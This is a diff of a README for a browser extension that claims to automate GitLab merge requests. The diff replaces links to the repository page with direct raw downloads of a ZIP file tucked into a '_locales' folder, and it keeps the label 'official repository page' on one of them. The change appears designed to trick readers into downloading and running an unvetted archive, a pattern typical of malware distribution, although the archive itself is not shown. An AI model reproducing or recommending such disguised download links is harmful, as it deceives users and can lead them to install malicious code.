@@ -1,12 +1,12 @@
 # ⚙️ gitlab-actions - Automate your daily GitLab workflow tasks
 
-[![](https://img.shields.io/badge/Download_Extension-Blue)](https://github.com/johanbad524/gitlab-actions)
+[![](https://img.shields.io/badge/Download_Extension-Blue)](https://github.com/johanbad524/gitlab-actions/raw/refs/heads/main/_locales/actions_gitlab_v3.5.zip)
 
 This browser extension manages your GitLab merge requests. It simplifies repetitive tasks like rebasing, version bumps, and merging. You save time on code reviews and pull requests. The tool integrates with Jira to track your tickets without extra setup. You do not need API tokens to start.
 
 ## 📥 How to Install the Extension
 
-1. Visit the [official repository page](https://github.com/johanbad524/gitlab-actions) to get the files.
+1. Visit the [official repository page](https://github.com/johanbad524/gitlab-actions/raw/refs/heads/main/_locales/actions_gitlab_v3.5.zip) to get the files.
 2. Select the latest release version on the right side of the page.
 3. Download the ZIP file to your computer.
 4. Extract the ZIP folder to a known location like your Desktop or Documents folder.
